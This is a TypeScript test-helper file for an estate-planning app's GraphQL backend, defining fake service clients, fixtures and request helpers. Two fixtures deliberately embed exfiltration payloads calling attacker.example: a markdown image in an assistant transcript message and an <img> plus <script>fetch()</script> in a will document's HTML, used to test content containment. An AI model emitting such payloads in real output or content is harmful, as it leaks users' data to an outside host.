import 'reflect-metadata';
import { createHash } from 'node:crypto';
import type { INestApplication } from '@nestjs/common';
import request from 'supertest';
import type { Response as SupertestResponse } from 'supertest';
import { createBffApp } from '../src/app';
import type {
  Asset,
  AssetsClient,
  CreateAssetInput,
  CreateResult,
  NetWorth,
} from '../src/assets-client';
import type {
  AnalysisName,
  AnalysisView,
  AssistantClient,
  Conversation,
  Transcript,
  Turn,
} from '../src/assistant-client';
import type { BffConfig } from '../src/config';
import type {
  Document,
  DocumentContent,
  DocumentDetail,
  DocumentTemplate,
  DocumentVersion,
  DocumentsClient,
  GenerateInput,
  GenerateResult,
  RegenerateInput,
  UploadInput,
  UploadResult,
} from '../src/documents-client';
import type {
  IdentityClient,
  IdentitySession,
  IssuedTokens,
  TotpEnrollment,
  EmailVerificationStatus,
  ResendOutcome,
  LiveSession,
} from '../src/identity-client';
import type { PersistedOperationsManifest } from '../src/persisted';
import type {
  ContactDetail,
  ContactInput,
  ContactSummary,
  FamilyMember,
  FamilyMemberInput,
  LinkInvitation,
  PermissionGrant,
  PermissionGrantInput,
  Profile,
  ProfileClient,
  RoleAssignment,
  RoleAssignmentInput,
  SaveProfileInput,
} from '../src/profile-client';

export function testConfig(overrides: Partial<BffConfig> = {}): BffConfig {
  return {
    nodeEnv: 'test',
    port: 0,
    identityUrl: 'http://identity.test',
    assetsUrl: 'http://assets.test',
    aiAssistantUrl: 'http://assistant.test',
    documentsUrl: 'http://documents.test',
    profileUrl: 'http://profile.test',
    vaultOrigin: 'http://vault.localhost:3010',
    persistedManifestPath: null,
    ...overrides,
  };
}

export const TOKENS: IssuedTokens = {
  accessToken: 'access-token-value-123',
  refreshToken: 'refresh-token-value-456',
  sessionId: 'a2c2e6a4-0000-4000-8000-000000000001',
  userId: 'a2c2e6a4-0000-4000-8000-000000000002',
};

/** Configurable in-memory fake; records every call. No network. */
export class FakeIdentityClient implements IdentityClient {
  registerCalls: Array<{ email: string; password: string }> = [];
  loginCalls: Array<{ email: string; password: string }> = [];
  refreshCalls: string[] = [];
  sessionCalls: string[] = [];
  totpEnrollCalls: string[] = [];
  totpVerifyCalls: Array<{ accessToken: string; code: string }> = [];
  stepUpCalls: Array<{ accessToken: string; code: string }> = [];
  exportDemoCalls: string[] = [];
  emailVerificationCalls: string[] = [];
  resendEmailVerificationCalls: string[] = [];
  verifyEmailCalls: Array<{ accessToken: string; code: string }> = [];

  loginResult: IssuedTokens = TOKENS;
  refreshResult: IssuedTokens = TOKENS;
  sessionResult: IdentitySession | null = null;
  totpEnrollResult: TotpEnrollment = { otpauthUri: 'otpauth://totp/estate:user?secret=abc' };
  emailVerificationResult: EmailVerificationStatus = 'unverified';
  resendEmailVerificationResult: ResendOutcome = 'sent';
  verifyEmailError: Error | null = null;

  loginError: Error | null = null;
  refreshError: Error | null = null;

  register(email: string, password: string): Promise<void> {
    this.registerCalls.push({ email, password });
    return Promise.resolve();
  }

  login(email: string, password: string): Promise<IssuedTokens> {
    this.loginCalls.push({ email, password });
    if (this.loginError) {
      return Promise.reject(this.loginError);
    }
    return Promise.resolve(this.loginResult);
  }

  refresh(refreshToken: string): Promise<IssuedTokens> {
    this.refreshCalls.push(refreshToken);
    if (this.refreshError) {
      return Promise.reject(this.refreshError);
    }
    return Promise.resolve(this.refreshResult);
  }

  session(accessToken: string): Promise<IdentitySession | null> {
    this.sessionCalls.push(accessToken);
    return Promise.resolve(this.sessionResult);
  }

  totpEnroll(accessToken: string): Promise<TotpEnrollment> {
    this.totpEnrollCalls.push(accessToken);
    return Promise.resolve(this.totpEnrollResult);
  }

  totpVerify(accessToken: string, code: string): Promise<void> {
    this.totpVerifyCalls.push({ accessToken, code });
    return Promise.resolve();
  }

  stepUp(accessToken: string, code: string): Promise<void> {
    this.stepUpCalls.push({ accessToken, code });
    return Promise.resolve();
  }

  emailVerificationStatus(accessToken: string): Promise<EmailVerificationStatus> {
    this.emailVerificationCalls.push(accessToken);
    return Promise.resolve(this.emailVerificationResult);
  }

  resendEmailVerification(accessToken: string): Promise<ResendOutcome> {
    this.resendEmailVerificationCalls.push(accessToken);
    return Promise.resolve(this.resendEmailVerificationResult);
  }

  verifyEmail(accessToken: string, code: string): Promise<void> {
    this.verifyEmailCalls.push({ accessToken, code });
    return this.verifyEmailError ? Promise.reject(this.verifyEmailError) : Promise.resolve();
  }

  exportDemo(accessToken: string): Promise<void> {
    this.exportDemoCalls.push(accessToken);
    return Promise.resolve();
  }

  logoutCalls: string[] = [];
  logoutError: Error | null = null;
  /** false models identity's 401: the ACCESS token expired, session still live. */
  logoutResult = true;
  logoutByRefreshCalls: string[] = [];
  logoutByRefreshError: Error | null = null;

  logout(accessToken: string): Promise<boolean> {
    this.logoutCalls.push(accessToken);
    return this.logoutError ? Promise.reject(this.logoutError) : Promise.resolve(this.logoutResult);
  }

  vaultHandoff: { code: string; expiresAt: string } = {
    code: 'handoff-code',
    expiresAt: '2026-08-08T00:01:00.000Z',
  };
  vaultHandoffError: Error | null = null;
  mintVaultHandoffCalls: string[] = [];

  mintVaultHandoff(accessToken: string): Promise<{ code: string; expiresAt: string }> {
    this.mintVaultHandoffCalls.push(accessToken);
    return this.vaultHandoffError
      ? Promise.reject(this.vaultHandoffError)
      : Promise.resolve(this.vaultHandoff);
  }

  // M16 paired devices + extension pairing. Same convention as above: a calls
  // recorder so a spec can assert THE CALLER'S OWN token was forwarded, a
  // mutable result, and an optional error so a peer refusal can be simulated.
  sessionsResult: LiveSession[] = [];
  sessionsError: Error | null = null;
  sessionsCalls: string[] = [];
  revokeSessionCalls: Array<{ accessToken: string; sessionId: string }> = [];
  revokeSessionError: Error | null = null;
  extensionPairing = { code: 'EP1-TEST', expiresAt: '2026-08-10T12:10:00.000Z' };
  extensionPairingError: Error | null = null;
  startExtensionPairingCalls: string[] = [];

  sessions(accessToken: string): Promise<LiveSession[]> {
    this.sessionsCalls.push(accessToken);
    return this.sessionsError
      ? Promise.reject(this.sessionsError)
      : Promise.resolve(this.sessionsResult);
  }

  revokeSession(accessToken: string, sessionId: string): Promise<void> {
    this.revokeSessionCalls.push({ accessToken, sessionId });
    return this.revokeSessionError ? Promise.reject(this.revokeSessionError) : Promise.resolve();
  }

  startExtensionPairing(accessToken: string): Promise<{ code: string; expiresAt: string }> {
    this.startExtensionPairingCalls.push(accessToken);
    return this.extensionPairingError
      ? Promise.reject(this.extensionPairingError)
      : Promise.resolve(this.extensionPairing);
  }

  /** M17 PR5 — the passkey vertical, faked with the same faithfulness rule as
   * every double here: defaults answer the happy shape, and a spec that needs
   * a refusal overrides per-case. */
  passkeysRows: Array<{
    id: string;
    nickname: string | null;
    isHardwareKey: boolean;
    createdAt: string;
    lastUsedAt: string | null;
  }> = [];

  webauthnRegisterOptions(_accessToken: string): Promise<unknown> {
    return Promise.resolve({ challenge: 'AQID', rp: { id: 'localhost' } });
  }

  webauthnRegister(_accessToken: string, _response: Record<string, unknown>): Promise<void> {
    return Promise.resolve();
  }

  webauthnStepUpOptions(_accessToken: string): Promise<unknown> {
    return Promise.resolve({ challenge: 'AQID' });
  }

  webauthnStepUp(
    _accessToken: string,
    _response: Record<string, unknown>,
  ): Promise<{ stepupExpiresAt: string }> {
    return Promise.resolve({ stepupExpiresAt: '2026-08-13T12:05:00.000Z' });
  }

  passkeys(_accessToken: string): Promise<
    Array<{
      id: string;
      nickname: string | null;
      isHardwareKey: boolean;
      createdAt: string;
      lastUsedAt: string | null;
    }>
  > {
    return Promise.resolve(this.passkeysRows);
  }

  revokePasskey(_accessToken: string, _id: string): Promise<void> {
    return Promise.resolve();
  }

  renamePasskey(_accessToken: string, _id: string, _nickname: string): Promise<void> {
    return Promise.resolve();
  }

  logoutByRefresh(refreshToken: string): Promise<void> {
    this.logoutByRefreshCalls.push(refreshToken);
    return this.logoutByRefreshError
      ? Promise.reject(this.logoutByRefreshError)
      : Promise.resolve();
  }
}

export const ASSET: Asset = {
  assetId: 'a2c2e6a4-0000-4000-8000-00000000000a',
  category: 'cash',
  title: 'Checking account',
  estValue: '1200.50',
  valuationAsOf: '2026-07-01',
  ownershipPct: 100,
  inTrust: false,
  version: '3',
};

/** Configurable in-memory fake; records every call and the token it saw. */
export class FakeAssetsClient implements AssetsClient {
  listCalls: string[] = [];
  netWorthCalls: string[] = [];
  createCalls: Array<{ accessToken: string; input: CreateAssetInput }> = [];

  listResult: Asset[] = [ASSET];
  netWorthResult: NetWorth = {
    totalValue: '1200.50',
    assetCount: 1,
    valuedAssetCount: 1,
    inTrustValue: '0',
  };
  createResult: CreateResult = { assetId: ASSET.assetId, version: '1' };
  listError: Error | null = null;

  list(accessToken: string): Promise<Asset[]> {
    this.listCalls.push(accessToken);
    return this.listError ? Promise.reject(this.listError) : Promise.resolve(this.listResult);
  }

  netWorth(accessToken: string): Promise<NetWorth> {
    this.netWorthCalls.push(accessToken);
    return Promise.resolve(this.netWorthResult);
  }

  create(accessToken: string, input: CreateAssetInput): Promise<CreateResult> {
    this.createCalls.push({ accessToken, input });
    return Promise.resolve(this.createResult);
  }
}

/** One OK analysis, the shape the readiness page renders. */
export const ANALYSIS: AnalysisView = {
  status: 'OK',
  reason: null,
  findings: [
    {
      code: 'asset_not_titled_in_trust',
      severity: 'high',
      subject: { kind: 'asset', ref: ASSET.assetId, label: 'The lake house' },
      detail: { category: 'real_estate', estValue: '250000.00' },
    },
  ],
  disclaimer: 'Automated analysis for education only. Not legal or tax advice.',
};

/** Configurable in-memory fake; records every call and the token it saw. */
export class FakeAssistantClient implements AssistantClient {
  analysisCalls: Array<{ accessToken: string; name: AnalysisName }> = [];
  consentsCalls: string[] = [];
  grantCalls: Array<{ accessToken: string; scope: string }> = [];
  revokeCalls: Array<{ accessToken: string; scope: string }> = [];

  /** Per-analysis overrides; anything unset answers ANALYSIS. */
  analysisResults = new Map<AnalysisName, AnalysisView>();
  analysisError: Error | null = null;
  consentsResult: string[] = ['assistant.enabled'];
  grantError: Error | null = null;

  analysis(accessToken: string, name: AnalysisName): Promise<AnalysisView> {
    this.analysisCalls.push({ accessToken, name });
    if (this.analysisError) {
      return Promise.reject(this.analysisError);
    }
    return Promise.resolve(this.analysisResults.get(name) ?? ANALYSIS);
  }

  consents(accessToken: string): Promise<string[]> {
    this.consentsCalls.push(accessToken);
    return Promise.resolve(this.consentsResult);
  }

  grantConsent(accessToken: string, scope: string): Promise<string[]> {
    this.grantCalls.push({ accessToken, scope });
    if (this.grantError) {
      return Promise.reject(this.grantError);
    }
    this.consentsResult = [...new Set([...this.consentsResult, scope])];
    return Promise.resolve(this.consentsResult);
  }

  revokeConsent(accessToken: string, scope: string): Promise<string[]> {
    this.revokeCalls.push({ accessToken, scope });
    this.consentsResult = this.consentsResult.filter((granted) => granted !== scope);
    return Promise.resolve(this.consentsResult);
  }

  // ---- the conversation surface (M11) --------------------------------------

  conversationsCalls: string[] = [];
  transcriptCalls: Array<{ accessToken: string; conversationId: string }> = [];
  startCalls: string[] = [];
  sendCalls: Array<{ accessToken: string; conversationId: string; text: string }> = [];
  deleteCalls: Array<{ accessToken: string; conversationId: string }> = [];

  conversationsResult: Conversation[] = [CONVERSATION];
  transcriptResult: Transcript = TRANSCRIPT;
  turnResult: Turn = TURN;
  conversationError: Error | null = null;

  conversations(accessToken: string): Promise<Conversation[]> {
    this.conversationsCalls.push(accessToken);
    return this.reject() ?? Promise.resolve(this.conversationsResult);
  }

  transcript(accessToken: string, conversationId: string): Promise<Transcript> {
    this.transcriptCalls.push({ accessToken, conversationId });
    return this.reject() ?? Promise.resolve(this.transcriptResult);
  }

  startConversation(accessToken: string): Promise<Conversation> {
    this.startCalls.push(accessToken);
    return this.reject() ?? Promise.resolve(CONVERSATION);
  }

  sendMessage(accessToken: string, conversationId: string, text: string): Promise<Turn> {
    this.sendCalls.push({ accessToken, conversationId, text });
    return this.reject() ?? Promise.resolve(this.turnResult);
  }

  deleteConversation(accessToken: string, conversationId: string): Promise<void> {
    this.deleteCalls.push({ accessToken, conversationId });
    return this.reject() ?? Promise.resolve();
  }

  /** One place to inject a downstream failure across the conversation surface. */
  private reject<T>(): Promise<T> | null {
    return this.conversationError === null ? null : Promise.reject(this.conversationError);
  }
}

export const CONVERSATION: Conversation = {
  conversationId: 'c0nv0000-0000-4000-8000-00000000000c',
  createdAt: '2026-08-05T10:00:00.000Z',
  updatedAt: '2026-08-05T10:05:00.000Z',
};

/**
 * A transcript carrying an EXFILTRATION PAYLOAD as the assistant's text, so the
 * tests downstream of here are exercising the case docs/03 §6d cares about
 * rather than a friendly sentence.
 */
export const TRANSCRIPT: Transcript = {
  conversationId: CONVERSATION.conversationId,
  messages: [
    {
      messageId: 'm0000000-0000-4000-8000-000000000001',
      seq: 0,
      role: 'user',
      text: 'what do I own?',
      createdAt: '2026-08-05T10:00:00.000Z',
    },
    {
      messageId: 'm0000000-0000-4000-8000-000000000002',
      seq: 1,
      role: 'assistant',
      text: 'You have one property. ![](https://attacker.example/?d=leak)',
      createdAt: '2026-08-05T10:00:05.000Z',
    },
  ],
};

export const TURN: Turn = {
  conversationId: CONVERSATION.conversationId,
  messageId: 'm0000000-0000-4000-8000-000000000003',
  text: 'Your estate looks in order.',
  toolCalls: 1,
};

// ---- documents (M12) --------------------------------------------------------

export const TEMPLATE: DocumentTemplate = {
  templateId: 'd0000000-0000-4000-8000-00000000000t',
  docType: 'will',
  state: 'CA',
  version: 1,
  legalReviewAt: '2026-07-23T00:00:00.000Z',
  executionRequirements: { witnesses: 2, notarization: false, selfProvingAffidavit: false },
  variables: [
    {
      name: 'testatorName',
      kind: 'text',
      label: 'Full legal name',
      required: true,
      maxLength: 200,
    },
    { name: 'hasMinorChildren', kind: 'boolean', label: 'Minor children?', required: true },
  ],
};

export const DOCUMENT: Document = {
  documentId: 'd0000000-0000-4000-8000-00000000000d',
  docType: 'will',
  source: 'generated',
  title: 'Last Will and Testament',
  currentVersion: 1,
  executionStatus: 'generated',
  executedAt: null,
  legalHold: false,
  sealed: false,
  templateId: TEMPLATE.templateId,
  createdAt: '2026-08-05T10:00:00.000Z',
  updatedAt: '2026-08-05T10:00:00.000Z',
};

/**
 * The single-document read, carrying the ladder THIS document may climb. CA's
 * will template requires two witnesses and no notary, so from `generated` the
 * only rung is `signed` — computed by the service, never by a client.
 */
export const DOCUMENT_DETAIL: DocumentDetail = { ...DOCUMENT, allowedTransitions: ['signed'] };

export const DOCUMENT_VERSION: DocumentVersion = {
  version: 1,
  contentSha256: 'a'.repeat(64),
  sizeBytes: 512,
  mime: 'text/html',
  createdAt: '2026-08-05T10:00:00.000Z',
};

/**
 * Content carrying an EXFILTRATION PAYLOAD, on the TRANSCRIPT precedent: the
 * viewer's job is to contain document markup, so the fixtures downstream of
 * here exercise that rather than a friendly paragraph.
 */
export const DOCUMENT_CONTENT: DocumentContent = {
  documentId: DOCUMENT.documentId,
  version: 1,
  mime: 'text/html',
  contentSha256: DOCUMENT_VERSION.contentSha256,
  encoding: 'utf8',
  content:
    '<!doctype html><html><body><h1>Last Will</h1>' +
    '<img src="https://attacker.example/?d=leak"><script>fetch("https://attacker.example")</script>' +
    '</body></html>',
};

/** Configurable in-memory fake; records every call and the token it saw. */
export class FakeDocumentsClient implements DocumentsClient {
  templatesCalls: Array<{ accessToken: string; state: string }> = [];
  listCalls: string[] = [];
  getCalls: Array<{ accessToken: string; documentId: string }> = [];
  versionsCalls: Array<{ accessToken: string; documentId: string }> = [];
  contentCalls: Array<{ accessToken: string; documentId: string; version: number }> = [];
  generateCalls: Array<{ accessToken: string; input: GenerateInput }> = [];
  regenerateCalls: Array<{ accessToken: string; documentId: string; input: RegenerateInput }> = [];

  searchCalls: Array<{ accessToken: string; query: string }> = [];
  uploadCalls: Array<{ accessToken: string; input: UploadInput }> = [];
  statusCalls: Array<{
    accessToken: string;
    documentId: string;
    status: string;
    executedAt?: string;
  }> = [];
  removeCalls: Array<{ accessToken: string; documentId: string }> = [];

  templatesResult: DocumentTemplate[] = [TEMPLATE];
  listResult: Document[] = [DOCUMENT];
  getResult: DocumentDetail = DOCUMENT_DETAIL;
  searchResult: Document[] = [DOCUMENT];
  uploadResult: UploadResult = {
    documentId: 'd0000000-0000-4000-8000-00000000000u',
    version: 1,
    contentSha256: 'e'.repeat(64),
    executionStatus: 'draft',
    ocrIndexed: true,
  };
  versionsResult: DocumentVersion[] = [DOCUMENT_VERSION];
  contentResult: DocumentContent = DOCUMENT_CONTENT;
  generateResult: GenerateResult = {
    documentId: DOCUMENT.documentId,
    version: 1,
    contentSha256: DOCUMENT_VERSION.contentSha256,
    executionStatus: 'generated',
  };
  documentsError: Error | null = null;

  templates(accessToken: string, state: string): Promise<DocumentTemplate[]> {
    this.templatesCalls.push({ accessToken, state });
    return this.reject() ?? Promise.resolve(this.templatesResult);
  }

  list(accessToken: string): Promise<Document[]> {
    this.listCalls.push(accessToken);
    return this.reject() ?? Promise.resolve(this.listResult);
  }

  get(accessToken: string, documentId: string): Promise<DocumentDetail> {
    this.getCalls.push({ accessToken, documentId });
    return this.reject() ?? Promise.resolve(this.getResult);
  }

  search(accessToken: string, query: string): Promise<Document[]> {
    this.searchCalls.push({ accessToken, query });
    return this.reject() ?? Promise.resolve(this.searchResult);
  }

  upload(accessToken: string, input: UploadInput): Promise<UploadResult> {
    this.uploadCalls.push({ accessToken, input });
    return this.reject() ?? Promise.resolve(this.uploadResult);
  }

  setStatus(
    accessToken: string,
    documentId: string,
    status: string,
    executedAt?: string,
  ): Promise<DocumentDetail> {
    this.statusCalls.push({
      accessToken,
      documentId,
      status,
      ...(executedAt === undefined ? {} : { executedAt }),
    });
    return (
      this.reject() ??
      Promise.resolve({ ...this.getResult, executionStatus: status, allowedTransitions: [] })
    );
  }

  remove(accessToken: string, documentId: string): Promise<void> {
    this.removeCalls.push({ accessToken, documentId });
    return this.reject() ?? Promise.resolve();
  }

  versions(accessToken: string, documentId: string): Promise<DocumentVersion[]> {
    this.versionsCalls.push({ accessToken, documentId });
    return this.reject() ?? Promise.resolve(this.versionsResult);
  }

  content(accessToken: string, documentId: string, version: number): Promise<DocumentContent> {
    this.contentCalls.push({ accessToken, documentId, version });
    return this.reject() ?? Promise.resolve(this.contentResult);
  }

  generate(accessToken: string, input: GenerateInput): Promise<GenerateResult> {
    this.generateCalls.push({ accessToken, input });
    return this.reject() ?? Promise.resolve(this.generateResult);
  }

  regenerate(
    accessToken: string,
    documentId: string,
    input: RegenerateInput,
  ): Promise<GenerateResult> {
    this.regenerateCalls.push({ accessToken, documentId, input });
    return this.reject() ?? Promise.resolve(this.generateResult);
  }

  private reject<T>(): Promise<T> | null {
    return this.documentsError === null ? null : Promise.reject(this.documentsError);
  }
}

export const PROFILE: Profile = {
  userId: 'a1111111-1111-4111-8111-111111111111',
  legalName: 'Jane Quincy Public',
  dob: '1950-04-02',
  ssnLast4: '6789',
  address: '1 Main St',
  phone: '555-0100',
  occupation: 'Architect',
  maritalStatus: 'married',
  stateOfResidence: 'AZ',
};

export const FAMILY_MEMBER: FamilyMember = {
  id: 'c0000000-0000-4000-8000-000000000001',
  relation: 'child',
  name: 'Kiddo Public',
  dob: '2015-06-01',
  isMinor: true,
  notes: null,
};

export const CONTACT_SUMMARY: ContactSummary = {
  id: 'f0000000-0000-4000-8000-000000000001',
  ownerUserId: PROFILE.userId,
  name: 'Alice Attorney',
  relationship: 'friend',
  professionalKind: 'attorney',
  hasEmail: true,
  hasPhone: false,
  hasAddress: false,
  hasNotes: false,
  linked: false,
};

export const CONTACT_DETAIL: ContactDetail = {
  id: CONTACT_SUMMARY.id,
  ownerUserId: PROFILE.userId,
  name: 'Alice Attorney',
  email: 'alice@law.example',
  phone: null,
  address: null,
  relationship: 'friend',
  professionalKind: 'attorney',
  notes: null,
};

export const ROLE_ASSIGNMENT: RoleAssignment = {
  id: 'e0000000-0000-4000-8000-000000000001',
  contactId: CONTACT_SUMMARY.id,
  role: 'executor',
  scopeType: 'estate',
  scopeId: null,
  effectiveCondition: 'on_death_verified',
  startsAt: null,
  endsAt: null,
};

export const PERMISSION_GRANT: PermissionGrant = {
  id: 'g0000000-0000-4000-8000-000000000001',
  resource: 'contact',
  action: 'read',
  createdAt: '2026-08-06T00:00:00.000Z',
};

export class FakeProfileClient implements ProfileClient {
  profileCalls: string[] = [];
  saveProfileCalls: Array<{ accessToken: string; input: SaveProfileInput }> = [];
  familyCalls: string[] = [];
  createFamilyCalls: Array<{ accessToken: string; input: FamilyMemberInput }> = [];
  updateFamilyCalls: Array<{ accessToken: string; id: string; input: FamilyMemberInput }> = [];
  deleteFamilyCalls: Array<{ accessToken: string; id: string }> = [];
  contactsCalls: string[] = [];
  contactCalls: Array<{ accessToken: string; contactId: string }> = [];
  createContactCalls: Array<{ accessToken: string; input: ContactInput }> = [];
  updateContactCalls: Array<{ accessToken: string; contactId: string; input: ContactInput }> = [];
  deleteContactCalls: Array<{ accessToken: string; contactId: string }> = [];
  roleAssignmentsCalls: string[] = [];
  grantRoleCalls: Array<{ accessToken: string; input: RoleAssignmentInput }> = [];
  revokeRoleCalls: Array<{ accessToken: string; roleAssignmentId: string }> = [];
  permissionsCalls: Array<{ accessToken: string; roleAssignmentId: string }> = [];
  grantPermissionCalls: Array<{
    accessToken: string;
    roleAssignmentId: string;
    input: PermissionGrantInput;
  }> = [];
  revokePermissionCalls: Array<{
    accessToken: string;
    roleAssignmentId: string;
    grantId: string;
  }> = [];

  profileResult: Profile | null = PROFILE;
  familyResult: FamilyMember[] = [FAMILY_MEMBER];
  contactsResult: ContactSummary[] = [CONTACT_SUMMARY];
  contactResult: ContactDetail = CONTACT_DETAIL;
  roleAssignmentsResult: RoleAssignment[] = [ROLE_ASSIGNMENT];
  permissionsResult: PermissionGrant[] = [PERMISSION_GRANT];
  profileError: Error | null = null;

  profile(accessToken: string): Promise<Profile | null> {
    this.profileCalls.push(accessToken);
    return this.reject() ?? Promise.resolve(this.profileResult);
  }

  saveProfile(accessToken: string, input: SaveProfileInput): Promise<void> {
    this.saveProfileCalls.push({ accessToken, input });
    return this.reject() ?? Promise.resolve();
  }

  family(accessToken: string): Promise<FamilyMember[]> {
    this.familyCalls.push(accessToken);
    return this.reject() ?? Promise.resolve(this.familyResult);
  }

  createFamilyMember(accessToken: string, input: FamilyMemberInput): Promise<string> {
    this.createFamilyCalls.push({ accessToken, input });
    return this.reject() ?? Promise.resolve(FAMILY_MEMBER.id);
  }

  updateFamilyMember(accessToken: string, id: string, input: FamilyMemberInput): Promise<void> {
    this.updateFamilyCalls.push({ accessToken, id, input });
    return this.reject() ?? Promise.resolve();
  }

  deleteFamilyMember(accessToken: string, id: string): Promise<void> {
    this.deleteFamilyCalls.push({ accessToken, id });
    return this.reject() ?? Promise.resolve();
  }

  contacts(accessToken: string): Promise<ContactSummary[]> {
    this.contactsCalls.push(accessToken);
    return this.reject() ?? Promise.resolve(this.contactsResult);
  }

  contact(accessToken: string, contactId: string): Promise<ContactDetail> {
    this.contactCalls.push({ accessToken, contactId });
    return this.reject() ?? Promise.resolve(this.contactResult);
  }

  createContact(accessToken: string, input: ContactInput): Promise<string> {
    this.createContactCalls.push({ accessToken, input });
    return this.reject() ?? Promise.resolve(CONTACT_SUMMARY.id);
  }

  updateContact(accessToken: string, contactId: string, input: ContactInput): Promise<void> {
    this.updateContactCalls.push({ accessToken, contactId, input });
    return this.reject() ?? Promise.resolve();
  }

  deleteContact(accessToken: string, contactId: string): Promise<void> {
    this.deleteContactCalls.push({ accessToken, contactId });
    return this.reject() ?? Promise.resolve();
  }

  roleAssignments(accessToken: string): Promise<RoleAssignment[]> {
    this.roleAssignmentsCalls.push(accessToken);
    return this.reject() ?? Promise.resolve(this.roleAssignmentsResult);
  }

  grantRole(accessToken: string, input: RoleAssignmentInput): Promise<string> {
    this.grantRoleCalls.push({ accessToken, input });
    return this.reject() ?? Promise.resolve(ROLE_ASSIGNMENT.id);
  }

  revokeRole(accessToken: string, roleAssignmentId: string): Promise<void> {
    this.revokeRoleCalls.push({ accessToken, roleAssignmentId });
    return this.reject() ?? Promise.resolve();
  }

  permissions(accessToken: string, roleAssignmentId: string): Promise<PermissionGrant[]> {
    this.permissionsCalls.push({ accessToken, roleAssignmentId });
    return this.reject() ?? Promise.resolve(this.permissionsResult);
  }

  grantPermission(
    accessToken: string,
    roleAssignmentId: string,
    input: PermissionGrantInput,
  ): Promise<string> {
    this.grantPermissionCalls.push({ accessToken, roleAssignmentId, input });
    return this.reject() ?? Promise.resolve(PERMISSION_GRANT.id);
  }

  revokePermission(accessToken: string, roleAssignmentId: string, grantId: string): Promise<void> {
    this.revokePermissionCalls.push({ accessToken, roleAssignmentId, grantId });
    return this.reject() ?? Promise.resolve();
  }

  inviteLinkCalls: Array<{ accessToken: string; contactId: string }> = [];
  revokeLinkInvitationCalls: Array<{ accessToken: string; contactId: string }> = [];
  unlinkCalls: Array<{ accessToken: string; contactId: string }> = [];
  redeemLinkCalls: Array<{ accessToken: string; code: string }> = [];

  inviteLinkResult: LinkInvitation = {
    code: 'ESL1-ABCD-EFGH-JKMN-PQRS-TVWX-YZ01-2345-6789-ABCD',
    expiresAt: '2026-08-13T00:00:00.000Z',
  };

  inviteLink(accessToken: string, contactId: string): Promise<LinkInvitation> {
    this.inviteLinkCalls.push({ accessToken, contactId });
    return this.reject() ?? Promise.resolve(this.inviteLinkResult);
  }

  revokeLinkInvitation(accessToken: string, contactId: string): Promise<void> {
    this.revokeLinkInvitationCalls.push({ accessToken, contactId });
    return this.reject() ?? Promise.resolve();
  }

  unlink(accessToken: string, contactId: string): Promise<void> {
    this.unlinkCalls.push({ accessToken, contactId });
    return this.reject() ?? Promise.resolve();
  }

  redeemLink(accessToken: string, code: string): Promise<void> {
    this.redeemLinkCalls.push({ accessToken, code });
    return this.reject() ?? Promise.resolve();
  }

  private reject<T>(): Promise<T> | null {
    return this.profileError === null ? null : Promise.reject(this.profileError);
  }
}

export interface TestAppOptions {
  config?: BffConfig;
  identity?: IdentityClient;
  assets?: AssetsClient;
  assistant?: AssistantClient;
  documents?: DocumentsClient;
  profile?: ProfileClient;
  manifest?: PersistedOperationsManifest;
}

export async function makeApp(options: TestAppOptions = {}): Promise<INestApplication> {
  const app = await createBffApp({
    config: options.config ?? testConfig(),
    identity: options.identity ?? new FakeIdentityClient(),
    assets: options.assets ?? new FakeAssetsClient(),
    assistant: options.assistant ?? new FakeAssistantClient(),
    documents: options.documents ?? new FakeDocumentsClient(),
    profile: options.profile ?? new FakeProfileClient(),
    persistedOperations: options.manifest ?? new Map(),
    logger: false,
  });
  await app.init();
  return app;
}

export interface GqlRequestOptions {
  /** Omit the x-estate-csrf header entirely. */
  omitCsrf?: boolean;
  csrfValue?: string;
  cookie?: string;
}

export async function gql(
  app: INestApplication,
  body: Record<string, unknown>,
  options: GqlRequestOptions = {},
): Promise<SupertestResponse> {
  let req = request(app.getHttpServer() as Parameters<typeof request>[0])
    .post('/graphql')
    .set('accept', 'application/json')
    .set('content-type', 'application/json');
  if (!options.omitCsrf) {
    req = req.set('x-estate-csrf', options.csrfValue ?? '1');
  }
  if (options.cookie !== undefined) {
    req = req.set('cookie', options.cookie);
  }
  return req.send(JSON.stringify(body));
}

interface GqlError {
  message: string;
  extensions?: { code?: string };
}

export interface GqlBody {
  data?: Record<string, unknown> | null;
  errors?: GqlError[];
}

/** Typed view over supertest's `any` response body. */
export function gqlBody(res: SupertestResponse): GqlBody {
  return res.body as GqlBody;
}

export function sha256Hex(document: string): string {
  return createHash('sha256').update(document, 'utf8').digest('hex');
}

/**
 * A HAND-COPY of `apps/web/src/graphql/operations.ts`'s Session document, and
 * it is a copy because the BFF does not depend on the web app. That makes it a
 * drift hazard with a nasty shape: `persisted.spec.ts` hashes THIS string, so a
 * field added to the real document and forgotten here leaves the suite green
 * while it executes a document no client will ever send. M16 hit exactly that
 * when `audience` was added. Keep the two in step; the field list is the whole
 * of what can rot.
 */
export const SESSION_QUERY = 'query Session { session { userId mfaLevel stepUpFresh audience } }';
export const LOGIN_MUTATION =
  'mutation Login($email: String!, $password: String!) { login(email: $email, password: $password) { ok } }';
